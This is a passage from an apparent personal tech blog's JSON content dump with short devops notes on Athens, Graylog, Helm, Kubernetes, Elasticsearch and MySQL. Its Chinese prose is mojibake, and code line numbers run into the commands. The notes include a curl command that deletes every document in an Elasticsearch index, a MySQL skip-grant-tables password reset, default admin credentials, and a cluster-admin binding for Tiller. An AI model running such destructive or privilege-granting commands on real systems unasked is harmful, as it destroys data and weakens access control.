å®‰è£…","slug":"history/tech/5cb343f30a8b9161717951e6","date":"2019-04-14T02:30:11.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb343f30a8b9161717951e6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb343f30a8b9161717951e6/","excerpt":"","text":"ç¼–è¯‘123git clone https://github.com/gomods/athenscd athensmakeé€šè¿‡åˆ›å»º .netrc æ–‡ä»¶ï¼ŒéªŒè¯ç§æœ‰ä»“åº“ï¼š1234//.netrcmachine gitlab.xxx.com login MY_USERNAME password MY_PASSWORD","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"npm install ä¸å®‰è£… devDependencies","slug":"history/tech/5cb1f3900a8b9161717951e5","date":"2019-04-13T02:34:56.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb1f3900a8b9161717951e5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb1f3900a8b9161717951e5/","excerpt":"","text":"é—®é¢˜ï¼šnpm install ä¸å®‰è£… devDependenciesè§£å†³ï¼šæ£€æŸ¥npm configå€¼æ˜¯å¦è®¾ç½®ä¸ºtrueã€‚å¦‚æœè¿™ä¸ªå€¼æ˜¯çœŸï¼Œå®ƒå°†è·³è¿‡å¼€å‘ä¾èµ–é¡¹12npm config get productionnpm config set -g production false","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"graylog å®‰è£…","slug":"history/tech/5cb054500a8b9161717951e4","date":"2019-04-11T21:03:12.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb054500a8b9161717951e4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb054500a8b9161717951e4/","excerpt":"","text":"12yum install perl-Digest-SHAecho -n yourpassword | shasum -a 256è´¦å·å¯†ç å‡ä¸º admin/etc/graylog/server/server.conf1234567891011121314151617181920212223242526272829303132333435363738394041424344454647is_master = truenode_id_file = /etc/graylog/server/node-idroot_username = adminroot_timezone = Asia/Shanghaipassword_secret = 8d969eef6ecad3c29a3a62password_secret_sha2 = 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918root_password_sha2 = 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918rest_listen_uri = http://0.0.0.0:9000/api/rest_transport_uri = http://0.0.0.0:9000/api/web_enable = trueweb_listen_uri = http://0.0.0.0:9000/web_endpoint_uri = http://0.0.0.0:9000/apiweb_enable_cors = trueelasticsearch_hosts = http://10.0.0.15:9200rotation_strategy = countelasticsearch_max_docs_per_index = 20000000elasticsearch_max_number_of_indices = 20retention_strategy = deleteelasticsearch_shards = 5elasticsearch_replicas = 0elasticsearch_index_prefix = graylogallow_leading_wildcard_searches = falseallow_highlighting = trueelasticsearch_analyzer = standardoutput_batch_size = 500output_flush_interval = 1output_fault_count_threshold = 5output_fault_penalty_seconds = 30processbuffer_processors = 5outputbuffer_processors = 3processor_wait_strategy = blockingring_size = 65536inputbuffer_ring_size = 65536inputbuffer_processors = 2inputbuffer_wait_strategy = blockingmongodb_uri = mongodb://&lt;user&gt;&lt;password&gt;@10.0.0.15:27017/graylog?replicaSet=xxx","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"helm åè¯è§£é‡Š","slug":"history/tech/5caf5dfc0a8b9161717951e3","date":"2019-04-11T03:32:12.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5caf5dfc0a8b9161717951e3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5caf5dfc0a8b9161717951e3/","excerpt":"","text":"Chartchart å°±æ˜¯ Helm æ‰€ç®¡ç†çš„åŒ…ReleaseRelease å°±æ˜¯ chart åœ¨ K8S ä¸Šéƒ¨ç½²åçš„å®ä¾‹ã€‚chart çš„æ¯æ¬¡éƒ¨ç½²éƒ½å°†äº§ç”Ÿä¸€æ¬¡ ReleaseRepositoryRepository å°±æ˜¯å­—é¢æ„æ€ï¼Œå­˜å‚¨ chart çš„ä»“åº“ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåˆå§‹åŒ– Helm çš„æ—¶å€™ï¼Œä¼šæ·»åŠ ä¸¤ä¸ªä»“åº“ï¼Œä¸€ä¸ªæ˜¯ stable ä»“åº“ kubernetes-charts.storage.googleapis.com å¦ä¸€ä¸ªåˆ™æ˜¯ local ä»“åº“ï¼Œåœ°å€æ˜¯ http://127.0.0.1:8879/charts ã€‚ConfigConfig æ˜¯è‡ªå®šä¹‰çš„é…ç½®ï¼Œåœ¨éƒ¨ç½²æ—¶å€™ï¼Œä¼šå°† config ä¸ chart è¿›è¡Œåˆå¹¶ï¼Œå…±åŒæ„æˆæˆ‘ä»¬å°†éƒ¨ç½²çš„åº”ç”¨ã€‚helm é€šè¿‡ socat çš„ç«¯å£è½¬å‘ï¼ˆæˆ–è€…è¯´ K8S çš„ä»£ç†ï¼‰ï¼Œè¿›è€Œå®ç°äº†æœ¬åœ°ä¸ Tiller çš„é€šä¿¡Tiller é»˜è®¤é‡‡ç”¨ ClusterIP ç±»å‹çš„ Service è¿›è¡Œéƒ¨ç½²ã€‚è€Œæˆ‘ä»¬çŸ¥é“çš„ ClusterIP ç±»å‹çš„ Service æ˜¯ä»…é™é›†ç¾¤å†…è®¿é—®çš„:1kubectl -n kube-system get svc","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"docker é•œåƒæ€§èƒ½å¯¹æ¯”æµ‹è¯•","slug":"history/tech/5caf370f0a8b9161717951e2","date":"2019-04-11T00:46:07.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5caf370f0a8b9161717951e2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5caf370f0a8b9161717951e2/","excerpt":"","text":"http://moelove.info/docker-python-perf/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å°† docker compose æ–‡ä»¶è½¬æ¢ä¸º k8s æ–‡ä»¶","slug":"history/tech/5caf36b30a8b9161717951e1","date":"2019-04-11T00:44:35.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5caf36b30a8b9161717951e1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5caf36b30a8b9161717951e1/","excerpt":"","text":"https://github.com/kubernetes/kompose","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"elasticsearch æ¸…ç©ºç´¢å¼•","slug":"history/tech/5caefada0a8b9161717951e0","date":"2019-04-10T20:29:14.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5caefada0a8b9161717951e0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5caefada0a8b9161717951e0/","excerpt":"","text":"1curl -XPOST http://localhost:9200/index/_delete_by_query?refresh\\&amp;slices=100\\&amp;pretty -H &apos;Content-Type: application/json&apos; -d @query_all.jsonquery_all.json:123&#123; &quot;query&quot;: &#123;&quot;match_all&quot;: &#123;&#125;&#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"elasticsearch ä¿®æ”¹å‰¯æœ¬æ•°","slug":"history/tech/5caef9110a8b9161717951df","date":"2019-04-10T20:21:37.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5caef9110a8b9161717951df/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5caef9110a8b9161717951df/","excerpt":"","text":"12345curl -XPUT http://localhost:9200/index/_settings -d &apos;&#123; &quot;index&quot;: &#123; &quot;number_of_replicas&quot;: &quot;5&quot; &#125;&#125;&apos;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mysql 5.7 å¿˜è®°å¯†ç ","slug":"history/tech/5cad62c80a8b9161717951dc","date":"2019-04-10T03:28:08.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cad62c80a8b9161717951dc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cad62c80a8b9161717951dc/","excerpt":"","text":"12[mysqld]skip-grant-tables1update user set authentication_string = password(&quot;123456&quot;) where user=&quot;root&quot;;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos7 å®‰è£… mysql5.7","slug":"history/tech/5cae00900a8b9161717951de","date":"2019-04-10T02:41:20.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cae00900a8b9161717951de/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cae00900a8b9161717951de/","excerpt":"","text":"123456rpm -ivh https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm //æ·»åŠ ä»“åº“yum repolist all | grep mysql | grep enabled // ç¡®è®¤æ·»åŠ æˆåŠŸä¸å¦yum -y install mysql-community-server //å®‰è£…systemctl enable mysqldsystemctl start mysqld // å¯åŠ¨cat /var/log/mysqld.log | grep -i &apos;temporary password&apos; // æŸ¥çœ‹åˆå§‹åŒ–å¯†ç è®¾ç½® utf-8 ç¼–ç  vim /etc/my.cnf12345678910[client]default-character-set=utf8[mysql]default-character-set=utf8[mysqld]collation-server = utf8_unicode_ciinit-connect=&apos;SET NAMES utf8&apos;character-set-server = utf8","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"helm å®‰è£…","slug":"history/tech/5cadac8f0a8b9161717951dd","date":"2019-04-09T20:42:55.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cadac8f0a8b9161717951dd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cadac8f0a8b9161717951dd/","excerpt":"","text":"å‰æï¼š$HOME/.kube/config éœ€è¦æå‰é…ç½®å¥½ä¸‹è½½ï¼š1https://github.com/helm/helm/releasesæŸ¥çœ‹ç‰ˆæœ¬ï¼š1helm versionhelm é»˜è®¤ä¼šå»è¯»å– $HOME/.kube/config çš„é…ç½®æ–‡ä»¶ï¼Œç”¨äºæ­£ç¡®çš„è¿æ¥è‡³ç›®æ ‡é›†ç¾¤ æœ¬åœ°å®‰è£…12./tillerexport HELM_HOST=localhost:44134 k8så®‰è£…1helm init --upgrade -i registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.14.1 --stable-repo-url https://kubernetes.oss-cn-hangzhou.aliyuncs.com/chartsHelm init --upgradeä¼šåœ¨Kubernetesé›†ç¾¤ä¸Šå®‰è£…é…ç½®Tiller, é•œåƒé»˜è®¤ä½¿ç”¨ https://gcr.io/kubernetes-helm/tiller; ä»“åº“é»˜è®¤ä½¿ç”¨ https://kubernetes-charts.storage.googleapis.comã€‚ç”±äºå›½å†…æ— æ³•è®¿é—®ç›¸å…³åŸŸåï¼Œå¯ä»¥ä½¿ç”¨é˜¿é‡Œäº‘å®¹å™¨æœåŠ¡æä¾›çš„é•œåƒå’Œç«™ç‚¹ã€‚helm init ä¼šåˆå§‹åŒ– helm çš„é»˜è®¤ç›®å½• $HELM_HOME é»˜è®¤å€¼ä¸º $HOME/.helmæŸ¥çœ‹å®¹å™¨å¯åŠ¨æƒ…å†µ12kubectl get po -n kube-systemkubectl -n kube-system get deploy tiller-deployå®‰è£… helm æœåŠ¡ç«¯ tillerï¼Œæ˜¯å¯ä»¥é€šè¿‡ kubectl éƒ¨ç½²çš„, æŸ¥çœ‹éƒ¨ç½²é…ç½®çš„å‘½ä»¤å¦‚ä¸‹ï¼š1helm init --dry-run --debugæŸ¥çœ‹å·²éƒ¨ç½²çš„åº”ç”¨1helm listä»Kubernetes 1.6å¼€å§‹ï¼ŒAPI Serverå¯ç”¨äº†RBACæˆæƒã€‚è€ŒTilleréƒ¨ç½²æ²¡æœ‰å®šä¹‰æˆæƒçš„ServiceAccountï¼Œè¿™ä¼šå¯¼è‡´è®¿é—®API Serveræ—¶è¢«æ‹’ç»ã€‚æˆ‘ä»¬å¯ä»¥é‡‡ç”¨å¦‚ä¸‹æ–¹æ³•ï¼Œä¸ºTilleréƒ¨ç½²æ·»åŠ æˆæƒã€‚123kubectl create serviceaccount --namespace kube-system tillerkubectl create clusterrolebinding tiller-cluster-rule --clusterrole=cluster-admin --serviceaccount=kube-system:tillerkubectl patch deploy --namespace kube-system tiller-deploy -p &apos;&#123;&quot;spec&quot;:&#123;&quot;template&quot;:&#123;&quot;spec&quot;:&#123;&quot;serviceAccount&quot;:&quot;tiller&quot;&#125;&#125;&#125;&#125;&apos;é…ç½®æ–‡ä»¶æ–¹å¼ï¼šåˆ›å»ºä¸€ä¸ª ServiceAccount å‘½åä¸º tillerï¼Œä¸ºäº†ç®€å•ï¼Œæˆ‘ä»¬ç›´æ¥å°†å®ƒä¸ cluster-admin è¿›è¡Œç»‘å®šã€‚tiller-rbac.yaml:123456789101112131415161718apiVersion: v1kind: ServiceAccountmetadata: name: tiller namespace: kube-system---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: name: tillerroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-adminsubjects: - kind: ServiceAccount name: tiller namespace: kube-systemæ‰§è¡Œï¼š1kubectl apply -f tiller-rbac.yamlå‚è€ƒèµ„æ–™:https://www.jianshu.com/p/699c5ced3f87https://github.com/BurdenBear/kube-charts-mirror","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"cannot change locale","slug":"history/tech/5cac9a320a8b9161717951db","date":"2019-04-09T01:12:18.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cac9a320a8b9161717951db/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cac9a320a8b9161717951db/","excerpt":"","text":"emac iterm2 ssh ç™»å½• centos1warning: setlocale: LC_CTYPE: cannot change locale (UTF-8): No such file or directoryåŸå› :æ²¡æœ‰utf-8è¿™ä¸ªè¯­ç³»ï¼ˆæ²¡æ·»åŠ è¯­è¨€_å›½åå‰ç¼€ï¼‰ï¼ŒLC_ALLåˆæ²¡è®¾å®šå€¼ã€‚ è§£å†³æ–¹æ³•ï¼šåœ¨è¿œç¨‹ç³»ç»Ÿä¸Šï¼Œ /etc/environment åŠ å…¥ä»¥ä¸‹ä¸¤è¡Œï¼Œé‡æ–°ç™»é™†å³å¯ã€‚12LANG=en_US.utf-8LC_ALL=en_US.utf-8Macç»ˆç«¯è§£å†³æ–¹æ³•ï¼šç¼–è¾‘ ~/.bashrc æˆ–è€… ~/.zshrc æ–‡ä»¶ï¼Œæ·»åŠ 12export LC_ALL=en_US.UTF-8 export LANG=en_US.UTF-8","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"k8s æ•´ä½“æ¶æ„","slug":"history/tech/5ca56a8e9a5c06d95c088a9a","date":"2019-04-04T02:23:10.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5ca56a8e9a5c06d95c088a9a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ca56a8e9a5c06d95c088a9a/","excerpt":"","text":"k8s å¯¹æ¯”å…¶å®ƒæ¡†æ¶1234mesos Marathon spark/hadoop docker/LXCcs æ¶æ„1234567891011121314 +-------------+ | | | | +---------------+ | | +-----&gt; | Node 1 | | Kubernetes | | +---------------++-----------------+ | Server | | | CLI | | | | +---------------+| (Kubectl) |-----------&gt;| ( Master ) |&lt;------+-----&gt; | Node 2 || | | | | +---------------++-----------------+ | | | | | | +---------------+ | | +-----&gt; | Node 3 | | | +---------------+ +-------------+1234567891011121314151617+----------------------------------------------------------+ | Master | | +-------------------------+ | | +-------&gt;| API Server |&lt;--------+ | | | | | | | | v +-------------------------+ v | | +----------------+ ^ +--------------------+ | | | | | | | | | | Scheduler | | | Controller Manager | | | | | | | | | | +----------------+ v +--------------------+ | | +------------------------------------------------------+ | | | | | | | Cluster state store | | | | | | | +------------------------------------------------------+ | +----------------------------------------------------------+scheduler è´Ÿè´£é€šè¿‡Api è°ƒåº¦ pod åˆ°æŸä¸ªnodeï¼Œ è°ƒåº¦ç¨‹åºåªè€ƒè™‘å¼€å§‹Nodeçš„çŠ¶æ€ï¼Œè€Œä¸è€ƒè™‘åœ¨è°ƒåº¦è¿‡ç¨‹ä¸­çš„çŠ¶æ€ï¼Œæœ€ç»ˆ pod èƒ½å¦è¿è¡Œåœ¨ node ä¸Šç”± kubelet è£å®šk8s å®ç° Container Runtime InterfaceContainer Runtimeï¼š123dockerrktcri-ok8s é€šè¿‡ kube-proxy ç¼–æ’ iptables å®ç°æµé‡è½¬å‘K8S é›†ç¾¤ï¼Œä¼šé»˜è®¤æœºå™¨çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¹¶è®¡ç®—åœ¨æ­¤ Node ä¸Šå¯è°ƒåº¦çš„ Pod æ•°é‡æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯çš„å‘½ä»¤:12345cat /etc/issuecat /etc/os-releasecat /proc/cpuinfocat /proc/meminfo freekubelet --hostname-override &lt;ä¸»æœºå&gt; å¯ä»¥ä¿®æ”¹ä¸»æœºå","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"k8s scheduler","slug":"history/tech/5ca5676e9a5c06d95c088a99","date":"2019-04-04T02:09:50.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5ca5676e9a5c06d95c088a99/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ca5676e9a5c06d95c088a99/","excerpt":"","text":"scheduler é€šè¿‡Api è°ƒåº¦ pod åˆ°æŸä¸ªnodeï¼Œ è°ƒåº¦ç¨‹åºåªè€ƒè™‘å¼€å§‹Nodeçš„çŠ¶æ€ï¼Œè€Œä¸è€ƒè™‘åœ¨è°ƒåº¦è¿‡ç¨‹ä¸­çš„çŠ¶æ€","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"kubectl å‘½ä»¤ä½¿ç”¨","slug":"history/tech/5ca335fc9a5c06d95c088a98","date":"2019-04-01T22:14:20.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5ca335fc9a5c06d95c088a98/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ca335fc9a5c06d95c088a98/","excerpt":"","text":"kubectl run çš„ä½¿ç”¨1kubectl run NAME --image=image [--env=&quot;key=value&quot;] [--port=port] [--replicas=replicas] [--dry-run=bool] [--overrides=inline-json] [--command] -- [COMMAND] [args...] [options]éƒ¨ç½² redis:1kubectl run redis --image=&apos;redis:alpine&apos;è¾“å‡ºï¼š12kubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead. kubectl get çš„ä½¿ç”¨1234kubectl get deployment.apps/redis -o widekubectl get rs -o wide // ReplicaSet å¯ç®€å†™ä¸º rs. pod-template æ ‡ç­¾æ˜¯ç”± Deployment controller è‡ªåŠ¨æ·»åŠ çš„ï¼Œhash ç”¨ä½œå”¯ä¸€æ€§æ ‡è¯†, ç›®çš„æ˜¯é˜²æ­¢å‡ºç°é‡å¤kubectl get service -o widekubectl get deploy -l run=redis -o wide // Label å¯ä½œä¸ºé€‰æ‹©æ¡ä»¶è¿›è¡Œä½¿ç”¨, é‡‘ä¸é›€å‘å¸ƒ(Canary deployments), ä¸»è¦ä¾èµ– Label å’Œ SelectorReplicaSet æ˜¯ä¸€ç§è¾ƒä½çº§åˆ«çš„ç»“æ„ï¼Œå…è®¸è¿›è¡Œæ‰©å®¹ã€‚Deployment ä¸»è¦æ˜¯å£°æ˜ä¸€ç§é¢„æœŸçš„çŠ¶æ€ï¼Œå¹¶ä¸”ä¼šå°† Pod æ‰˜ç®¡ç»™ ReplicaSetï¼Œè€Œ ReplicaSet åˆ™ä¼šå»æ£€æŸ¥å½“å‰çš„ Pod æ•°é‡åŠçŠ¶æ€æ˜¯å¦ç¬¦åˆé¢„æœŸï¼Œå¹¶å°½é‡æ»¡è¶³è¿™ä¸€é¢„æœŸã€‚ service å¤–éƒ¨è®¿é—®Service ç›®å‰æœ‰ 4 ç§ç±»å‹ï¼š1234ClusterIPï¼š æ˜¯ K8S å½“å‰é»˜è®¤çš„ Service ç±»å‹ã€‚å°† service æš´éœ²äºä¸€ä¸ªä»…é›†ç¾¤å†…å¯è®¿é—®çš„è™šæ‹Ÿ IP ä¸Šã€‚NodePortï¼š æ˜¯é€šè¿‡åœ¨é›†ç¾¤å†…æ‰€æœ‰ Node ä¸Šéƒ½ç»‘å®šå›ºå®šç«¯å£çš„æ–¹å¼å°†æœåŠ¡æš´éœ²å‡ºæ¥ï¼Œè¿™æ ·ä¾¿å¯ä»¥é€šè¿‡ &lt;NodeIP&gt;:&lt;NodePort&gt; è®¿é—®æœåŠ¡äº†ã€‚LoadBalancerï¼š æ˜¯é€šè¿‡ Cloud Provider åˆ›å»ºä¸€ä¸ªå¤–éƒ¨çš„è´Ÿè½½å‡è¡¡å™¨ï¼Œå°†æœåŠ¡æš´éœ²å‡ºæ¥ï¼Œå¹¶ä¸”ä¼šè‡ªåŠ¨åˆ›å»ºå¤–éƒ¨è´Ÿè½½å‡è¡¡å™¨è·¯ç”±è¯·æ±‚æ‰€éœ€çš„ Nodeport æˆ– ClusterIP ã€‚ExternalNameï¼š æ˜¯é€šè¿‡å°†æœåŠ¡ç”± DNS CNAME çš„æ–¹å¼è½¬å‘åˆ°æŒ‡å®šçš„åŸŸåä¸Šå°†æœåŠ¡æš´éœ²å‡ºæ¥ï¼Œè¿™éœ€è¦ kube-dns 1.7 æˆ–æ›´é«˜ç‰ˆæœ¬æ”¯æŒã€‚å°† redis æœåŠ¡æš´éœ²å‡ºæ¥1234567891011121314kubectl expose deploy/redis --port=6379 --protocol=TCP --target-port=6379 --name=redis-serverkubectl get svc -o widekubectl get no -o wideport: æ˜¯ Service æš´éœ²å‡ºæ¥çš„ç«¯å£ï¼Œå¯é€šè¿‡æ­¤ç«¯å£è®¿é—® Serviceã€‚protocolï¼š æ˜¯æ‰€ç”¨åè®®ã€‚å½“å‰ K8S æ”¯æŒ TCP/UDP åè®®ï¼Œåœ¨ 1.12 ç‰ˆæœ¬ä¸­å®éªŒæ€§çš„åŠ å…¥äº†å¯¹ SCTP åè®®çš„æ”¯æŒã€‚é»˜è®¤æ˜¯ TCP åè®®ã€‚target-portï¼š æ˜¯å®é™…æœåŠ¡æ‰€åœ¨çš„ç›®æ ‡ç«¯å£ï¼Œè¯·æ±‚ç”± port è¿›å…¥é€šè¿‡ä¸Šè¿°æŒ‡å®š protocol æœ€ç»ˆæµå‘è¿™é‡Œé…ç½®çš„ç«¯å£ã€‚nameï¼š Service çš„åå­—ï¼Œå®ƒçš„ç”¨å¤„ä¸»è¦åœ¨ dns æ–¹é¢ã€‚typeï¼š å¦‚æœæ²¡æŒ‡å®šé»˜è®¤æ˜¯ ClusterIPã€‚ClusterIP å¹¶ä¸èƒ½ç›´æ¥é€šè¿‡å¤–éƒ¨è¿›è¡Œè®¿é—®ï¼Œæˆ‘ä»¬ä½¿ç”¨ port-forward çš„æ–¹å¼è®©å®ƒå¯åœ¨é›†ç¾¤å¤–éƒ¨è®¿é—®:1kubectl port-forward svc/redis-server 6379:6379NodePort çš„æ–¹å¼å¯¹å¤–æš´éœ²æœåŠ¡:12kubectl expose deploy/redis --port=6379 --protocol=TCP --target-port=6379 --name=redis-server-nodeport --type=NodePortkubectl get service/redis-server-nodeport -o wideè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªç«¯å£èŒƒå›´å…¶å®æ˜¯å¯ä»¥é€šè¿‡ kube-apiserver çš„ service-node-port-range è¿›è¡Œé…ç½®çš„ï¼Œé»˜è®¤æ˜¯ 30000-32767(é€šè¿‡kube-apiserver çš„ service-node-port-range è¿›è¡Œé…ç½®)å¦‚æœä½¿ç”¨çš„æ˜¯ kind å®‰è£… éœ€è¦åœ¨ docker å†…éƒ¨è®¿é—®(è®¿é—®å‘½ä»¤ docker exec -it ${containerId} /bin/bash) Pod æ‰©å®¹12kubectl scale deploy/redis --replicas=2kubectl get podså‚è€ƒèµ„æ–™ï¼šSCTP","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"kubeadm æ­å»º 